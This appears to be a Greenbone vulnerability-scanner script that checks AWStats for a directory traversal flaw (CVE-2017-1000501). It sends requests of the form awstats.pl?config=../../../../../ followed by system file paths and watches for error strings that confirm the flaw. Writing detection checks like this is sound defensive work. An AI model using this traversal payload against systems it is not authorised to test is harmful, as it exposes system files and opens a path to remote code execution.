CPE = "cpe:/a:awstats:awstats";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.140659" );
	script_version( "2021-06-29T11:00:37+0000" );
	script_tag( name: "last_modification", value: "2021-06-29 11:00:37 +0000 (Tue, 29 Jun 2021)" );
	script_tag( name: "creation_date", value: "2018-01-08 11:12:36 +0700 (Mon, 08 Jan 2018)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-07-27 03:15:00 +0000 (Mon, 27 Jul 2020)" );
	script_cve_id( "CVE-2017-1000501" );
	script_name( "AWStats Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "awstats_detect.sc", "os_detection.sc" );
	script_mandatory_keys( "awstats/installed" );
	script_xref( name: "URL", value: "https://awstats.sourceforge.io/docs/awstats_changelog.txt" );
	script_xref( name: "URL", value: "http://seclists.org/oss-sec/2017/q4/435" );
	script_tag( name: "summary", value: "AWStats is vulnerable to a path traversal flaw in the handling of the
  'config' and 'migrate' parameters resulting in unauthenticated remote code execution." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "affected", value: "AWStats 7.6 and prior." );
	script_tag( name: "solution", value: "Upgrade to Version 7.7 or later" );
	script_tag( name: "qod_type", value: "remote_active" );
	script_tag( name: "solution_type", value: "VendorFix" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
files = traversal_files();
for pattern in keys( files ) {
	file = files[pattern];
	url = dir + "/awstats.pl?config=../../../../../" + file;
	if(http_vuln_check( port: port, url: url, pattern: "../../../../../" + file, check_header: TRUE, extra_check: make_list( "Warning: Syntax error line",
		 "file, web server or permissions) may be wrong." ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

